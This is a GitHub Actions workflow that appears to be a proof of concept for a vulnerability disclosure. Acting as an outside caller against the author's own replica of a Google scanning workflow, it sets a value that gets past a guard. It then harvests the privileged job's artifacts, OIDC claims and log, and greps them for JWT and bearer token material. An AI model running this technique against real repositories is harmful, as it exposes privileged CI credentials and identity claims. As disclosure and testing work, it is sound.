# CALLER configuration (DEMONSTRATION 1a, 2, 3, 4).
# Reaches the replica of google-gh-automation/workflows
# .github/workflows/github_actions_scan.yml @ 22b63c643fbe7b395b00cc3952ab552decc586c7
# through `workflow_call`, the way an arbitrary outside account would.
#
# It calls OUR OWN replica. It never calls Google's reusable workflow.
# `wif_provider` is deliberately NON-EMPTY and set to the exact string that the replica
# would otherwise fall back to, which is how an attacker satisfies the `zizmor-scan` guard
# while still aiming at the intended provider.

name: 'Caller A - call replica scan with non-empty wif_provider'

on:
  pull_request:

permissions: {}

jobs:
  scan:
    permissions:
      contents: 'read'
      id-token: 'write'
    uses: ooriime/oss-vrp-replica-workflows/.github/workflows/github_actions_scan.yml@main
    with:
      wif_provider: 'projects/000000000000/locations/global/workloadIdentityPools/replica-fake-pool/providers/replica-fake-provider'
      zizmor_result_bucket: 'caller-supplied-bucket-demo4'
      zizmor_enforce: 'false'

  caller-harvest:
    needs: ['scan']
    if: 'always()'
    runs-on: 'ubuntu-latest'
    permissions:
      actions: 'read'
      contents: 'read'
    steps:
      - name: 'DEMO 2 path A: reusable-workflow outputs visible to the caller'
        shell: 'bash'
        env:
          OUT_MANDATORY: '${{ needs.scan.outputs.mandatory-checks }}'
          OUT_ENFORCE: '${{ needs.scan.outputs.enforce }}'
          OUT_ALL: '${{ toJSON(needs.scan.outputs) }}'
          RESULT: '${{ needs.scan.result }}'
        run: |
          echo "DEMO2A: needs.scan.result                     = '${RESULT}'"
          echo "DEMO2A: needs.scan.outputs (toJSON)           = ${OUT_ALL}"
          echo "DEMO2A: needs.scan.outputs.mandatory-checks   = '${OUT_MANDATORY}'"
          echo "DEMO2A: needs.scan.outputs.enforce            = '${OUT_ENFORCE}'"
          {
            echo "### Demonstration 2, path A - what the CALLER can read from the called workflow's outputs"
            echo
            echo "| expression | value |"
            echo "|---|---|"
            echo "| \`needs.scan.result\` | \`${RESULT}\` |"
            echo "| \`toJSON(needs.scan.outputs)\` | \`${OUT_ALL}\` |"
            echo "| \`needs.scan.outputs.mandatory-checks\` | \`${OUT_MANDATORY}\` |"
            echo "| \`needs.scan.outputs.enforce\` | \`${OUT_ENFORCE}\` |"
            echo
            echo "The called workflow declares job-level \`outputs:\` but no \`on.workflow_call.outputs\`,"
            echo "so none of them reach the caller."
          } >> "$GITHUB_STEP_SUMMARY"

      - name: 'DEMO 3: list every artifact that the called workflow left in OUR run'
        shell: 'bash'
        env:
          GH_TOKEN: '${{ secrets.GITHUB_TOKEN }}'
        run: |
          gh api "/repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/artifacts" \
            --jq '.artifacts[] | {name, size_in_bytes, workflow_run: .workflow_run.id}' | tee artifact-listing.json

      - name: 'DEMO 3: download every artifact of this run as the caller'
        uses: 'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c' # ratchet:actions/download-artifact@v8
        with:
          path: 'harvested'

      - name: 'DEMO 3: read the privileged job output through its artifact'
        if: 'always()'
        shell: 'bash'
        run: |
          echo "=== tree of harvested artifacts ==="
          find harvested -type f | sort
          echo
          echo "=== harvested/zizmor-config/zizmor-config.yaml ==="
          cat harvested/zizmor-config/zizmor-config.yaml
          echo
          echo "=== mandatory-checks recomputed by the CALLER from the harvested artifact ==="
          yq eval '[.rules | to_entries | .[] | select(.value.remap.severity == "high")  | .key]' -o json --indent 0 harvested/zizmor-config/zizmor-config.yaml
          echo
          echo "=== harvested OIDC claims captured inside the privileged callee job ==="
          cat harvested/oidc-claims-called-zizmor-config/oidc-claims-called-zizmor-config.json
          echo
          echo "=== harvested/zizmor/enriched.sarif.json ==="
          cat harvested/zizmor/enriched.sarif.json

          {
            echo "### Demonstration 3 - artifacts the privileged callee left in the CALLER's run"
            echo
            echo '```'
            find harvested -type f | sort
            echo '```'
            echo
            echo "Post-processed scan configuration, downloaded by the caller:"
            echo '```yaml'
            cat harvested/zizmor-config/zizmor-config.yaml
            echo '```'
            echo
            echo "OIDC claims captured inside the privileged callee job, read by the caller:"
            echo '```json'
            cat harvested/oidc-claims-called-zizmor-config/oidc-claims-called-zizmor-config.json
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

      - name: 'DEMO 2 path B: does any harvested artifact contain token material?'
        if: 'always()'
        shell: 'bash'
        run: |
          echo "--- grep for JWT-shaped material (eyJ) ---"
          grep -R -o -n 'eyJ[A-Za-z0-9_-]\{8,\}' harvested || echo "NO MATCH: no JWT-shaped string in any artifact"
          echo "--- grep for the replica auth_token marker ---"
          grep -R -n 'replica-not-a-credential' harvested || echo "NO MATCH: auth_token value absent from every artifact"
          echo "--- grep for bearer/authorization headers ---"
          grep -R -n -i 'bearer\|authorization' harvested || echo "NO MATCH: no bearer/authorization material in any artifact"
          {
            echo "### Demonstration 2, path B - token material in the harvested artifacts"
            echo
            echo '```'
            echo "JWT-shaped (eyJ...):"
            grep -R -o 'eyJ[A-Za-z0-9_-]\{8,\}' harvested || echo "  NO MATCH"
            echo "auth_token value:"
            grep -R -o 'replica-not-a-credential' harvested || echo "  NO MATCH"
            echo "bearer / authorization:"
            grep -R -o -i 'bearer\|authorization' harvested || echo "  NO MATCH"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

      - name: 'DEMO 2 path C: can the caller read the privileged job log, and does it leak the token?'
        if: 'always()'
        shell: 'bash'
        env:
          GH_TOKEN: '${{ secrets.GITHUB_TOKEN }}'
        run: |
          gh api "/repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/jobs" \
            --jq '.jobs[] | "\(.id)\t\(.name)\t\(.conclusion)"' | tee job-listing.tsv
          JOB_ID="$(awk -F'\t' '/zizmor-config/ {print $1; exit}' job-listing.tsv)"
          echo "DEMO2C: privileged callee job id = '${JOB_ID}'"
          if [ -z "${JOB_ID}" ]; then
            echo "DEMO2C: zizmor-config job not present in this run"
            exit 0
          fi
          # Use curl rather than `gh api`: gh refuses to emit a body containing terminal
          # escape sequences, and Actions logs are full of them. curl drops the
          # Authorization header on the cross-host redirect to the pre-signed blob URL.
          HTTP_CODE="$(curl -sSL -o callee.log -w '%{http_code}' \
            -H "Authorization: Bearer ${GH_TOKEN}" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/jobs/${JOB_ID}/logs")"
          echo "DEMO2C: log fetch HTTP status = ${HTTP_CODE}, $(wc -c < callee.log) bytes"
          if [ "${HTTP_CODE}" != "200" ]; then
            echo "DEMO2C: caller could NOT read the privileged job log"; head -c 400 callee.log; exit 0
          fi
          echo "DEMO2C: caller CAN read the privileged job log"
          echo "--- lines mentioning the provider / masking / GOOGLE_ACCESS_TOKEN ---"
          grep -n 'workload_identity_provider\|GOOGLE_ACCESS_TOKEN\|add-mask\|auth_token' callee.log || true
          echo "--- grep for JWT-shaped material in the privileged job log ---"
          grep -o -n 'eyJ[A-Za-z0-9_-]\{8,\}' callee.log || echo "NO MATCH: no JWT-shaped string in the privileged job log"
          echo "--- grep for the auth_token value in the privileged job log ---"
          grep -n 'replica-not-a-credential-[0-9a-f]' callee.log || echo "NO MATCH: auth_token value never appears unmasked in the log"
          {
            echo "### Demonstration 2, path C - the privileged callee job's log, read by the CALLER"
            echo
            echo "| question | measured answer |"
            echo "|---|---|"
            echo "| can the caller fetch the privileged job's log? | HTTP \`${HTTP_CODE}\`, $(wc -c < callee.log) bytes |"
            MASKED="$(grep -c 'GOOGLE_ACCESS_TOKEN: \*\*\*' callee.log || true)"
            echo "| lines showing \`GOOGLE_ACCESS_TOKEN: ***\` | ${MASKED} |"
            JWTC="$(grep -c -o 'eyJ[A-Za-z0-9_-]\{8,\}' callee.log || true)"
            echo "| JWT-shaped strings in that log | ${JWTC} |"
            TOKC="$(grep -c 'replica-not-a-credential-[0-9a-f]' callee.log || true)"
            echo "| unmasked \`auth_token\` occurrences in that log | ${TOKC} |"
          } >> "$GITHUB_STEP_SUMMARY"

      - name: 'Publish harvest evidence'
        if: 'always()'
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # ratchet:actions/upload-artifact@v7
        with:
          name: 'caller-harvest-evidence'
          path: |
            artifact-listing.json
            job-listing.tsv
            callee.log
          if-no-files-found: 'warn'
          retention-days: 1
